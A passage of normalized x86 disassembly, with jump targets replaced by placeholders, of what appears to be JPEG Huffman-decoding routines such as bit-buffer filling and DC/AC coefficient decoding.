mov [ ecx + eax * 4 + 0x48 ] edx
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0x14 ]
xor eax eax
mov al [ edx ]
mov ecx [ ebp - 0xc ]
add ecx eax
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
mov ecx [ ebp + ecx * 4 - 0x530 ]
mov [ eax + edx * 4 ] ecx
jmp r-xdata
mov edx [ ebp - 0xc ]
movsx eax [ ebp + edx - 0x128 ]
test eax eax
je r-xdata
mov edx [ ebp + 0xc ]
and edx 0xff
test edx edx
je r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
mov ecx [ ebp - 0x14 ]
add ecx 0x1
mov [ ebp - 0x14 ] ecx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax [ ebp - 0x14 ]
xor ecx ecx
mov cl [ eax ]
cmp [ ebp - 0x10 ] ecx
jg r-xdata
mov ecx [ ebp - 0x10 ]
cmp ecx [ ebp - 0x1c ]
jge r-xdata
jmp r-xdata
mov ecx 0x8
sub ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp + edx * 4 - 0x52c ]
shl eax cl
mov [ ebp - 0x20 ] eax
mov ecx 0x8
sub ecx [ ebp - 0x14 ]
mov edx 0x1
shl edx cl
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0x10 ]
xor eax eax
mov al [ edx + 0x11 ]
mov [ ebp - 0x534 ] eax
cmp [ ebp - 0x534 ] 0x0
jl r-xdata
mov eax [ ebp - 0x14 ]
add eax 0x1
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x24 ] 0x0
jle r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x8
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx ]
add esp 0x4
cmp [ ebp - 0x534 ] 0xf
jle r-xdata
jmp r-xdata
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x14 ]
mov [ edx + ecx * 4 + 0x90 ] eax
mov ecx [ ebp - 0x8 ]
add ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0xc ]
mov al [ edx + 0x11 ]
mov [ ecx + 0x490 ] al
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
jmp r-xdata
mov eax [ ebp - 0x10 ]
add eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov ecx [ ebp - 0x10 ]
add ecx 0x1
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0xc ]
add edx 0x1
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x24 ]
sub eax 0x1
mov [ ebp - 0x24 ] eax
sub_423170
push ebp
mov ebp esp
sub esp 0x50
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x10 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0xc ]
cmp [ eax + 0x17c ] 0x0
jne r-xdata
mov ecx [ ebp + 0x14 ]
cmp ecx [ ebp + 0x10 ]
jle r-xdata
cmp [ ebp + 0x10 ] 0x19
jge r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ ecx ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
mov [ eax + 0x4 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ edx + 0x8 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
mov [ ecx + 0xc ] edx
mov al 0x1
mov edx [ ebp - 0xc ]
mov eax [ edx + 0x198 ]
xor ecx ecx
mov cl [ eax + 0x8 ]
test ecx ecx
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov ecx 0x19
sub ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
shl eax cl
mov [ ebp + 0xc ] eax
mov [ ebp + 0x10 ] 0x19
mov edx [ ebp - 0xc ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x75
push 0xffffffff
mov ecx [ ebp - 0xc ]
push ecx
mov edx [ ebp - 0xc ]
mov eax [ edx ]
call [ eax + 0x4 ]
add esp 0x8
mov ecx [ ebp - 0xc ]
mov edx [ ecx + 0x198 ]
mov [ edx + 0x8 ] 0x1
mov ecx [ ebp - 0x8 ]
sub ecx 0x1
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x4 ]
xor eax eax
mov al [ edx ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x4 ]
add ecx 0x1
mov [ ebp - 0x4 ] ecx
cmp [ ebp - 0x10 ] 0xff
jne r-xdata
mov ecx [ ebp - 0xc ]
push ecx
mov edx [ ebp - 0xc ]
mov eax [ edx + 0x18 ]
call [ eax + 0xc ]
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
mov edx [ ebp + 0xc ]
shl edx 0x8
or edx [ ebp - 0x10 ]
mov [ ebp + 0xc ] edx
mov eax [ ebp + 0x10 ]
add eax 0x8
mov [ ebp + 0x10 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ecx + 0x18 ]
mov eax [ edx ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
mov edx [ ecx + 0x18 ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
xor al al
jmp r-xdata
mov edx [ ebp - 0x8 ]
sub edx 0x1
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x4 ]
xor ecx ecx
mov cl [ eax ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x4 ]
add edx 0x1
mov [ ebp - 0x4 ] edx
cmp [ ebp - 0x10 ] 0xff
je r-xdata
mov edx [ ebp - 0xc ]
push edx
mov eax [ ebp - 0xc ]
mov ecx [ eax + 0x18 ]
call [ ecx + 0xc ]
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ edx + 0x18 ]
mov ecx [ eax ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0xc ]
mov eax [ edx + 0x18 ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x8 ] ecx
xor al al
jmp r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
mov [ eax + 0x17c ] ecx
jmp r-xdata
mov [ ebp - 0x10 ] 0xff
jmp r-xdata
sub_423340
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
push edi
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x10 ]
cmp ecx [ ebp - 0x4 ]
jge r-xdata
mov ecx [ ebp + 0x10 ]
sub ecx [ ebp - 0x4 ]
mov [ ebp + 0x10 ] ecx
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
sar edx cl
mov eax 0x1
mov ecx [ ebp - 0x4 ]
shl eax cl
sub eax 0x1
and edx eax
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0x4 ]
push edx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_423170
add esp 0x10
and eax 0xff
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ edx + 0x8 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
mov [ ecx + 0xc ] edx
cmp [ ebp - 0x4 ] 0x10
jle r-xdata
mov ecx [ ebp - 0x8 ]
shl ecx 0x1
mov [ ebp - 0x8 ] ecx
cmp [ ebp + 0x10 ] 0x1
jge r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov [ ebp + 0xc ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc ]
mov [ ebp + 0x10 ] eax
or eax 0xffffffff
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov eax [ edx + 0x8c ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
mov esi [ ebp - 0x8 ]
add esi [ edx + ecx * 4 + 0x48 ]
xor ecx ecx
mov cl [ eax + esi + 0x11 ]
mov eax ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x10 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x76
push 0xffffffff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x10 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
add esp 0x8
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
sub eax 0x1
mov [ ebp + 0x10 ] eax
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
sar edx cl
and edx 0x1
mov eax [ ebp - 0x8 ]
or eax edx
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x4 ]
add ecx 0x1
mov [ ebp - 0x4 ] ecx
jmp r-xdata
push 0x1
mov edx [ ebp + 0x10 ]
push edx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_423170
add esp 0x10
and eax 0xff
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
mov eax [ ebp - 0x8 ]
cmp eax [ edx + ecx * 4 ]
jle r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov [ ebp + 0xc ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xc ]
mov [ ebp + 0x10 ] edx
or eax 0xffffffff
jmp r-xdata
sub_4234a0
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
push edi
push 0xac
push 0x1
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
call [ edx ]
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x198 ] ecx
mov edx [ ebp - 0x4 ]
mov [ edx ] sub_423520
mov eax [ ebp - 0x4 ]
mov [ eax + 0x4 ] sub_423710
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
cmp [ ebp - 0x8 ] 0x4
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ eax + edx * 4 + 0x38 ] 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + ecx * 4 + 0x28 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
sub_423520
push ebp
mov ebp esp
sub esp 0x58
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x198 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x16c ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x7a
push 0xffffffff
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
add esp 0x8
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x170 ] 0x3f
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
cmp ecx [ eax + 0x124 ]
jge r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x174 ] 0x0
jne r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + edx * 4 + 0x128 ]
mov [ ebp - 0x18 ] ecx
mov edx [ ebp - 0x18 ]
mov eax [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x18 ]
mov edx [ ecx + 0x18 ]
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
lea edx [ ecx + eax * 4 + 0x28 ]
push edx
mov eax [ ebp - 0x10 ]
push eax
push 0x1
mov ecx [ ebp + 0x8 ]
push ecx
call sub_422d80
add esp 0x10
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
lea ecx [ eax + edx * 4 + 0x38 ]
push ecx
mov edx [ ebp - 0x14 ]
push edx
push 0x0
mov eax [ ebp + 0x8 ]
push eax
call sub_422d80
add esp 0x10
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + ecx * 4 + 0x14 ] 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x178 ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
cmp edx [ ecx + 0x140 ]
jge r-xdata
mov edx [ ebp - 0x8 ]
add edx 0x1
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] 0x0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0xc ] 0x0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] 0x0
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xfc ]
mov [ eax + 0x24 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + eax * 4 + 0x144 ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + eax * 4 + 0x128 ]
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x18 ]
mov ecx [ eax + 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov esi [ ebp - 0x4 ]
mov ecx [ esi + ecx * 4 + 0x28 ]
mov [ eax + edx * 4 + 0x48 ] ecx
mov edx [ ebp - 0x18 ]
mov eax [ edx + 0x18 ]
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov esi [ ebp - 0x4 ]
mov eax [ esi + eax * 4 + 0x38 ]
mov [ edx + ecx * 4 + 0x70 ] eax
mov ecx [ ebp - 0x18 ]
xor edx edx
mov dl [ ecx + 0x30 ]
test edx edx
je r-xdata
mov ecx [ ebp - 0x4 ]
add ecx [ ebp - 0xc ]
mov [ ecx + 0xa2 ] 0x0
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0xc ]
mov [ edx + 0x98 ] 0x0
mov eax [ ebp - 0x4 ]
add eax [ ebp - 0xc ]
mov [ eax + 0x98 ] 0x1
mov ecx [ ebp - 0x18 ]
xor edx edx
cmp [ ecx + 0x24 ] 0x1
setg dl
mov eax [ ebp - 0x4 ]
add eax [ ebp - 0xc ]
mov [ eax + 0xa2 ] dl
jmp r-xdata
mov eax [ ebp - 0xc ]
add eax 0x1
mov [ ebp - 0xc ] eax
jmp r-xdata
sub_423710
push ebp
mov ebp esp
sub esp 0xb0
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x198 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x8 ]
cmp [ edx + 0xfc ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
xor eax eax
mov al [ edx + 0x8 ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x24 ]
sub eax 0x1
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x24 ] eax
mov al 0x1
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x14 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x18 ]
mov ecx [ eax ]
mov [ ebp - 0x24 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x18 ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0xc ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x10 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x4 ]
add eax 0x14
mov ecx [ eax ]
mov [ ebp - 0x34 ] ecx
mov edx [ eax + 0x4 ]
mov [ ebp - 0x30 ] edx
mov ecx [ eax + 0x8 ]
mov [ ebp - 0x2c ] ecx
mov edx [ eax + 0xc ]
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_423d50
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
cmp edx [ ecx + 0x140 ]
jge r-xdata
xor al al
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x18 ]
mov eax [ ebp - 0x24 ]
mov [ edx ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x18 ]
mov eax [ ebp - 0x20 ]
mov [ edx + 0x4 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ ecx + 0xc ] edx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x10 ]
mov [ eax + 0x10 ] ecx
mov edx [ ebp - 0x4 ]
add edx 0x14
mov eax [ ebp - 0x34 ]
mov [ edx ] eax
mov ecx [ ebp - 0x30 ]
mov [ edx + 0x4 ] ecx
mov eax [ ebp - 0x2c ]
mov [ edx + 0x8 ] eax
mov ecx [ ebp - 0x28 ]
mov [ edx + 0xc ] ecx
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx [ ecx + eax * 4 ]
mov [ ebp - 0x38 ] edx
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + eax * 4 + 0x48 ]
mov [ ebp - 0x3c ] edx
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + eax * 4 + 0x70 ]
mov [ ebp - 0x40 ] edx
cmp [ ebp - 0x10 ] 0x8
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
sub ecx 0x8
mov edx [ ebp - 0xc ]
sar edx cl
and edx 0xff
mov [ ebp - 0x54 ] edx
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x3c ]
mov edx [ ecx + eax * 4 + 0x90 ]
mov [ ebp - 0x50 ] edx
cmp [ ebp - 0x50 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0xc ]
push ecx
lea edx [ ebp - 0x24 ]
push edx
call sub_423170
add esp 0x10
and eax 0xff
test eax eax
jne r-xdata
mov [ ebp - 0x50 ] 0x9
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0x50 ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x3c ]
add ecx [ ebp - 0x54 ]
xor edx edx
mov dl [ ecx + 0x490 ]
mov [ ebp - 0x44 ] edx
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x18 ]
mov [ ebp - 0x10 ] ecx
cmp [ ebp - 0x10 ] 0x8
jge r-xdata
xor al al
jmp r-xdata
mov edx [ ebp - 0x1c ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x10 ] eax
xor al al
jmp r-xdata
cmp [ ebp - 0x44 ] 0x0
je r-xdata
mov [ ebp - 0x50 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax [ ebp - 0x8 ]
xor ecx ecx
mov cl [ eax + 0x98 ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x10 ]
cmp ecx [ ebp - 0x44 ]
jge r-xdata
mov eax [ ebp - 0x50 ]
push eax
mov ecx [ ebp - 0x3c ]
push ecx
mov edx [ ebp - 0x10 ]
push edx
mov eax [ ebp - 0xc ]
push eax
lea ecx [ ebp - 0x24 ]
push ecx
call sub_423340
add esp 0x14
mov [ ebp - 0x44 ] eax
cmp [ ebp - 0x44 ] 0x0
jge r-xdata
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0x8 ]
xor eax eax
mov al [ edx + 0xa2 ]
test eax eax
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + edx * 4 + 0x144 ]
mov [ ebp - 0x58 ] ecx
mov edx [ ebp - 0x58 ]
mov eax [ ebp - 0x44 ]
add eax [ ebp + edx * 4 - 0x34 ]
mov [ ebp - 0x44 ] eax
mov ecx [ ebp - 0x58 ]
mov edx [ ebp - 0x44 ]
mov [ ebp + ecx * 4 - 0x34 ] edx
mov eax [ ebp - 0x38 ]
mov cx [ ebp - 0x44 ]
mov [ eax ] cx
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x44 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
sar eax cl
mov edx 0x1
mov ecx [ ebp - 0x44 ]
shl edx cl
sub edx 0x1
and eax edx
mov [ ebp - 0x4c ] eax
mov eax [ ebp - 0x44 ]
mov ecx [ ebp - 0x4c ]
cmp ecx [ eax * 4 + r--data ]
jge r-xdata
mov edx [ ebp - 0x44 ]
push edx
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0xc ]
push ecx
lea edx [ ebp - 0x24 ]
push edx
call sub_423170
add esp 0x10
and eax 0xff
test eax eax
jne r-xdata
mov [ ebp - 0x48 ] 0x1
jmp r-xdata
mov [ ebp - 0x48 ] 0x1
jmp r-xdata
mov ecx [ ebp - 0x4c ]
mov [ ebp - 0x6c ] ecx
mov edx [ ebp - 0x44 ]
mov eax [ ebp - 0x4c ]
add eax [ edx * 4 + r--data ]
mov [ ebp - 0x6c ] eax
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x18 ]
mov [ ebp - 0x10 ] ecx
xor al al
jmp r-xdata
cmp [ ebp - 0x48 ] 0x40
jge r-xdata
cmp [ ebp - 0x48 ] 0x40
jge r-xdata
mov edx [ ebp - 0x6c ]
mov [ ebp - 0x44 ] edx
jmp r-xdata
cmp [ ebp - 0x10 ] 0x8
jge r-xdata
jmp r-xdata
cmp [ ebp - 0x10 ] 0x8
jge r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x1
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x10 ]
sub ecx 0x8
mov edx [ ebp - 0xc ]
sar edx cl
and edx 0xff
mov [ ebp - 0x68 ] edx
mov eax [ ebp - 0x68 ]
mov ecx [ ebp - 0x40 ]
mov edx [ ecx + eax * 4 + 0x90 ]
mov [ ebp - 0x64 ] edx
cmp [ ebp - 0x64 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0xc ]
push ecx
lea edx [ ebp - 0x24 ]
push edx
call sub_423170
add esp 0x10
and eax 0xff
test eax eax
jne r-xdata
mov ecx [ ebp - 0x10 ]
sub ecx 0x8
mov edx [ ebp - 0xc ]
sar edx cl
and edx 0xff
mov [ ebp - 0x60 ] edx
mov eax [ ebp - 0x60 ]
mov ecx [ ebp - 0x40 ]
mov edx [ ecx + eax * 4 + 0x90 ]
mov [ ebp - 0x5c ] edx
cmp [ ebp - 0x5c ] 0x0
je r-xdata
push 0x0
mov edx [ ebp - 0x10 ]
push edx
mov eax [ ebp - 0xc ]
push eax
lea ecx [ ebp - 0x24 ]
push ecx
call sub_423170
add esp 0x10
and eax 0xff
test eax eax
jne r-xdata
mov [ ebp - 0x64 ] 0x9
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0x64 ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x40 ]
add ecx [ ebp - 0x68 ]
xor edx edx
mov dl [ ecx + 0x490 ]
mov [ ebp - 0x44 ] edx
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x18 ]
mov [ ebp - 0x10 ] ecx
cmp [ ebp - 0x10 ] 0x8
jge r-xdata
xor al al
jmp r-xdata
mov [ ebp - 0x5c ] 0x9
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0x5c ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x40 ]
add ecx [ ebp - 0x60 ]
xor edx edx
mov dl [ ecx + 0x490 ]
mov [ ebp - 0x44 ] edx
jmp r-xdata
mov edx [ ebp - 0x1c ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x8
jge r-xdata
xor al al
jmp r-xdata
mov edx [ ebp - 0x1c ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x10 ] eax
xor al al
jmp r-xdata
mov ecx [ ebp - 0x44 ]
sar ecx 0x4
mov [ ebp - 0x4c ] ecx
mov edx [ ebp - 0x44 ]
and edx 0xf
mov [ ebp - 0x44 ] edx
cmp [ ebp - 0x44 ] 0x0
je r-xdata
mov [ ebp - 0x64 ] 0x1
jmp r-xdata
mov edx [ ebp - 0x1c ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x10 ] eax
xor al al
jmp r-xdata
mov ecx [ ebp - 0x44 ]
sar ecx 0x4
mov [ ebp - 0x4c ] ecx
mov edx [ ebp - 0x44 ]
and edx 0xf
mov [ ebp - 0x44 ] edx
cmp [ ebp - 0x44 ] 0x0
je r-xdata
mov [ ebp - 0x5c ] 0x1
jmp r-xdata
cmp [ ebp - 0x4c ] 0xf
je r-xdata
mov eax [ ebp - 0x48 ]
add eax [ ebp - 0x4c ]
mov [ ebp - 0x48 ] eax
mov ecx [ ebp - 0x10 ]
cmp ecx [ ebp - 0x44 ]
jge r-xdata
mov eax [ ebp - 0x64 ]
push eax
mov ecx [ ebp - 0x40 ]
push ecx
mov edx [ ebp - 0x10 ]
push edx
mov eax [ ebp - 0xc ]
push eax
lea ecx [ ebp - 0x24 ]
push ecx
call sub_423340
add esp 0x14
mov [ ebp - 0x44 ] eax
cmp [ ebp - 0x44 ] 0x0
jge r-xdata
cmp [ ebp - 0x4c ] 0xf
je r-xdata
mov eax [ ebp - 0x48 ]
add eax [ ebp - 0x4c ]
mov [ ebp - 0x48 ] eax
mov ecx [ ebp - 0x10 ]
cmp ecx [ ebp - 0x44 ]
jge r-xdata
mov eax [ ebp - 0x5c ]
push eax
mov ecx [ ebp - 0x40 ]
push ecx
mov edx [ ebp - 0x10 ]
push edx
mov eax [ ebp - 0xc ]
push eax
lea ecx [ ebp - 0x24 ]
push ecx
call sub_423340
add esp 0x14
mov [ ebp - 0x44 ] eax
cmp [ ebp - 0x44 ] 0x0
jge r-xdata
mov eax [ ebp - 0x48 ]
add eax 0xf
mov [ ebp - 0x48 ] eax
jmp r-xdata
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x44 ]
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov edx [ ebp - 0x44 ]
push edx
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0xc ]
push ecx
lea edx [ ebp - 0x24 ]
push edx
call sub_423170
add esp 0x10
and eax 0xff
test eax eax
jne r-xdata
mov ecx [ ebp - 0x48 ]
add ecx 0xf
mov [ ebp - 0x48 ] ecx
jmp r-xdata
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x44 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
sar eax cl
mov edx 0x1
mov ecx [ ebp - 0x44 ]
shl edx cl
sub edx 0x1
and eax edx
mov [ ebp - 0x4c ] eax
mov eax [ ebp - 0x44 ]
mov ecx [ ebp - 0x4c ]
cmp ecx [ eax * 4 + r--data ]
jge r-xdata
mov edx [ ebp - 0x44 ]
push edx
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0xc ]
push ecx
lea edx [ ebp - 0x24 ]
push edx
call sub_423170
add esp 0x10
and eax 0xff
test eax eax
jne r-xdata
mov edx [ ebp - 0x48 ]
add edx 0x1
mov [ ebp - 0x48 ] edx
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x18 ]
mov [ ebp - 0x10 ] ecx
xor al al
jmp r-xdata
mov ecx [ ebp - 0x48 ]
add ecx 0x1
mov [ ebp - 0x48 ] ecx
mov ecx [ ebp - 0x4c ]
mov [ ebp - 0x70 ] ecx
mov edx [ ebp - 0x44 ]
mov eax [ ebp - 0x4c ]
